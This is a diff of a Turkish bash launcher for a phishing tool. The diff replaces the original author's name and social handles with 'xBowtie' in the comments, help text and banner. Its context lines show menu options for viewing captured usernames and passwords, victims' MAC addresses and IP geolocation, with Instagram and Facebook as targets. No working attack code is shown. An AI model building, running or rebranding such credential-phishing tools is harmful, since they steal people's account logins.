@@ -1,9 +1,6 @@
 #!/bin/bash
 #!/bin/sh
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#Code:xBowtie
 clear
 case $1 in
 
@@ -15,7 +12,7 @@ case $1 in
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
+bash xbowtie.sh & sh xbowtie.sh (Phishing Toolu 'nu Çalıştırır)
    "
   ;;
 
@@ -27,7 +24,7 @@ bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"
+bash xbowtie.sh & sh xbowtie.sh (Phishing Toolu 'nu Çalıştırır)"
 
   ;;
 
@@ -63,9 +60,9 @@ echo -e '\033[31;40;1m
 	────────────────█████████───────────────
 	──────────────█████████████─────────────
 
-	   \e[35m☾★ ☾★ ☾★ ☾★ YamanEfkar ☾★ ☾★ ☾★ ☾★	
-	 \e[31m☾★ ☾★ ☾★ ☾★ Türk Siber Timi ☾★ ☾★ ☾★ ☾★	
-  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : @turksibertimi ☾★ ☾★ ☾★ ☾★	
+	   \e[35m☾★ ☾★ ☾★ ☾★ xBowtie ☾★ ☾★ ☾★ ☾★	
+	 \e[31m☾★ ☾★ ☾★ ☾★ xBowtie ☾★ ☾★ ☾★ ☾★	
+  \e[32m☾★ ☾★ ☾★ ☾★ xBowtie ☾★ ☾★ ☾★ ☾★	
 '
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
